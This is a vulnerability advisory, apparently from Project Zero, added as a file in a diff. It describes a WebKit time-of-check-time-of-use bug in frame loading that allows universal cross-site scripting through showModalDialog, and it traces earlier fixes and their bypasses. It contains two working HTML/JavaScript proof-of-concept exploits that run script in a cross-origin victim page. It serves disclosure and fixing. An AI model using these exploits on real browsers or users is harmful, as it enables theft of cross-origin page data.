@@ -1,0 +1,240 @@
+BACKGROUND
+As lokihardt@ has demonstrated in https://bugs.chromium.org/p/project-zero/issues/detail?id=1121,
+WebKit's support of the obsolete `showModalDialog` method gives an attacker the ability to perform
+synchronous cross-origin page loads. In certain conditions, this might lead to
+time-of-check-time-of-use bugs in the code responsible for enforcing the Same-Origin Policy. In
+particular, the original bug exploited a TOCTOU bug in `SubframeLoader::requestFrame` to achieve
+UXSS.
+
+(copied from lokihardt's report)
+```
+bool SubframeLoader::requestFrame(HTMLFrameOwnerElement& ownerElement, const String& urlString, const AtomicString& frameName, LockHistory lockHistory, LockBackForwardList lockBackForwardList)
+{
+    // Support for <frame src="javascript:string">
+    URL scriptURL;
+    URL url;
+    if (protocolIsJavaScript(urlString)) {
+        scriptURL = completeURL(urlString); // completeURL() encodes the URL.
+        url = blankURL();
+    } else
+        url = completeURL(urlString);
+
+    if (shouldConvertInvalidURLsToBlank() && !url.isValid())
+        url = blankURL();
+
+    Frame* frame = loadOrRedirectSubframe(ownerElement, url, frameName, lockHistory, lockBackForwardList); <<------- in here, the synchronous page load is made.
+    if (!frame)
+        return false;
+
+    if (!scriptURL.isEmpty())
+        frame->script().executeIfJavaScriptURL(scriptURL); <<----- boooom
+
+    return true;
+}
+```
+
+The bug was fixed by inserting an extra access check right in front of the `executeIfJavaScriptURL`
+call.
+```
+-    if (!scriptURL.isEmpty())
++    if (!scriptURL.isEmpty() && ownerElement.isURLAllowed(scriptURL))
+         frame->script().executeIfJavaScriptURL(scriptURL);
+```
+
+It has stopped the original attack, but a year later https://bugs.webkit.org/show_bug.cgi?id=187203
+was reported, which abused the HTML parser to bypass the added check. The problem was that
+`isURLAllowed` didn't block `javascript:` URIs when the JavaScript execution context stack was
+empty, i.e. when the `requestFrame` call was originating from the parser, so the exploit just needed
+to make the parser insert an `iframe` element with a `javascript:` URI and use its `onload` handler
+to load a cross-origin page inside `loadOrRedirectSubframe`.
+
+As a result, another check has been added (see the comment below):
+```
++    bool hasExistingFrame = ownerElement.contentFrame();
+     Frame* frame = loadOrRedirectSubframe(ownerElement, url, frameName, lockHistory, lockBackForwardList);
+     if (!frame)
+         return false;
+ 
+-    if (!scriptURL.isEmpty() && ownerElement.isURLAllowed(scriptURL))
++    // If we create a new subframe then an empty document is loaded into it synchronously and may
++    // cause script execution (say, via a DOM load event handler) that can do anything, including
++    // navigating the subframe. We only want to evaluate scriptURL if the frame has not been navigated.
++    bool canExecuteScript = hasExistingFrame || (frame->loader().documentLoader() && frame->loader().documentLoader()->originalURL() == blankURL());
++    if (!scriptURL.isEmpty() && canExecuteScript && ownerElement.isURLAllowed(scriptURL))
+         frame->script().executeIfJavaScriptURL(scriptURL);
+```
+
+VULNERABILITY DETAILS
+The second fix relies on the assumption that the parser can't trigger a `requestFrame` call for an
+`iframe` element with an existing content frame. However, due to the way the node insertion
+algorithm is implemented, it's possible to run JavaScript while the element's insertion is still in
+progress:
+
+https://trac.webkit.org/browser/webkit/trunk/Source/WebCore/dom/ContainerNode.cpp#L185
+```
+static ALWAYS_INLINE void executeNodeInsertionWithScriptAssertion(ContainerNode& containerNode, Node& child,
+    ContainerNode::ChildChangeSource source, ReplacedAllChildren replacedAllChildren, DOMInsertionWork doNodeInsertion)
+{
+    NodeVector postInsertionNotificationTargets;
+    {
+        ScriptDisallowedScope::InMainThread scriptDisallowedScope;
+
+        if (UNLIKELY(containerNode.isShadowRoot() || containerNode.isInShadowTree()))
+            containerNode.containingShadowRoot()->resolveSlotsBeforeNodeInsertionOrRemoval();
+
+        doNodeInsertion();
+        ChildListMutationScope(containerNode).childAdded(child);
+        postInsertionNotificationTargets = notifyChildNodeInserted(containerNode, child);
+    }
+
+[...]
+
+    ASSERT(ScriptDisallowedScope::InMainThread::isEventDispatchAllowedInSubtree(child));
+    for (auto& target : postInsertionNotificationTargets)
+        target->didFinishInsertingNode();
+[...]
+```
+
+Note that `HTMLFrameElementBase::didFinishInsertingNode` eventually calls `requestFrame`. So, if a
+subtree which is being inserted contains multiple `iframe` elements, the first one can act as a
+trigger for the JavaScript code that creates a content frame for another element right before its
+`requestFrame` method is executed to bypass the `canExecuteScript` check. `isURLAllowed` again can
+be tricked with the help of the HTML parser.
+
+It's also worth noting that the `showModalDialog` method has to be triggered by a user gesture. On
+the other hand, an attacker can't just wrap the exploit in a `click` event handler, as it would put
+an execution context on the stack and make the `isURLAllowed` check fail. One way to overcome this
+is to save a gesture token by performing an asynchronous load of a `javascript:` URI.
+
+VERSION
+Safari 12.0.3 (14606.4.5)
+WebKit r243998
+
+REPRODUCTION CASE
+<body>
+<h1>Click anywhere</h1>
+<script>
+let counter = 0;
+function run() {
+  if (++counter == 2) {
+    parent_frame = frame.contentDocument.querySelector("iframe");
+    frame1 = parent_frame.appendChild(document.createElement("iframe"));
+    frame2 = parent_frame.appendChild(document.createElement("iframe"));
+    frame1.src = "javascript:top.runChild()";
+  }
+}
+
+let child_counter = 0;
+function runChild() {
+  if (++child_counter == 2) {
+    parent_frame.appendChild(frame2);
+
+    a = frame2.contentDocument.createElement("a");
+    a.href = cache_frame.src;
+    a.click();
+    
+    showModalDialog(URL.createObjectURL(new Blob([`
+      <script>
+        let intervalID = setInterval(() => {
+          try {
+            opener.frame.document.foo;
+          } catch (e) {
+            clearInterval(intervalID);
+
+            window.close();
+          }
+        }, 100);
+      </scr` + "ipt>"], {type: "text/html"})));
+    frame2.src = "javascript:alert(document.documentElement.outerHTML)";
+  }
+}
+
+onclick = _ => {
+  frame = document.body.appendChild(document.createElement("iframe"));
+  frame.contentWindow.location = `javascript:'<b><p><iframe`
+      + ` src="javascript:top.run()"></iframe></b></p>'`;
+}
+
+cache_frame = document.body.appendChild(document.createElement("iframe"));
+cache_frame.src = "http://example.com/"; // victim page URL
+cache_frame.style.display = "none";
+</script>
+</body>
+
+
+From WebKit's bugtracker:
+
+Unfortunately, even though the patch from https://trac.webkit.org/changeset/244892/webkit
+has blocked the original repro case because it relies on executing javascript: URIs synchronously,
+the underlying issue is still not fixed.
+
+Currently, `requestFrame` is implemented as follows:
+bool SubframeLoader::requestFrame(HTMLFrameOwnerElement& ownerElement, const String& urlString, const AtomicString& frameName, LockHistory lockHistory, LockBackForwardList lockBackForwardList)
+{
+[...]
+    Frame* frame = loadOrRedirectSubframe(ownerElement, url, frameName, lockHistory, lockBackForwardList); // ***1***
+    if (!frame)
+        return false;
+
+    if (!scriptURL.isEmpty() && ownerElement.isURLAllowed(scriptURL)) {
+        // FIXME: Some sites rely on the javascript:'' loading synchronously, which is why we have this special case.
+        // Blink has the same workaround (https://bugs.chromium.org/p/chromium/issues/detail?id=923585).
+        if (urlString == "javascript:''" || urlString == "javascript:\"\"")
+            frame->script().executeIfJavaScriptURL(scriptURL);
+        else
+            frame->navigationScheduler().scheduleLocationChange(ownerElement.document(), ownerElement.document().securityOrigin(), scriptURL, m_frame.loader().outgoingReferrer(), lockHistory, lockBackForwardList, stopDelayingLoadEvent.release()); // ***2***
+    }
+
+    return true;
+}
+
+By the time the subframe loader schedules a JS URI load in [2], the frame might already contain a
+cross-origin victim page loaded in [1], so the JS URI might get executed in the cross-origin
+context.
+
+Updated repro:
+<body>
+<h1>Click anywhere</h1>
+<script>
+let counter = 0;
+function run(event) {
+  ++counter;
+  if (counter == 2) {
+    event.target.src = "javascript:alert(document.documentElement.outerHTML)";
+  } else if (counter == 3) {
+    frame = event.target;
+
+    a = frame.contentDocument.createElement("a");
+    a.href = cache_frame.src;
+    a.click();
+
+    showModalDialog(URL.createObjectURL(new Blob([`
+      <script>
+        let intervalID = setInterval(() => {
+          try {
+            opener.frame.document.foo;
+          } catch (e) {
+            clearInterval(intervalID);
+
+            window.close();
+          }
+        }, 100);
+      </scr` + "ipt>"], {type: "text/html"})));
+  }
+}
+
+onclick = _ => {
+  frame = document.body.appendChild(document.createElement("iframe"));
+  frame.contentWindow.location = `javascript:'<b><p><iframe`
+      + ` onload="top.run(event)"></iframe></b></p>'`;
+}
+
+cache_frame = document.body.appendChild(document.createElement("iframe"));
+cache_frame.src = "http://example.com/"; // victim page URL
+cache_frame.style.display = "none";
+</script>
+</body>
+
+I'd recommend you consider applying a fix similar to the one that the Blink team has in
+https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/html/html_frame_element_base.cc?rcl=d3f22423d512b45466f1694020e20da9e0c6ee6a&l=62,
+i.e. using the frame's owner document as a fallback for the security check.
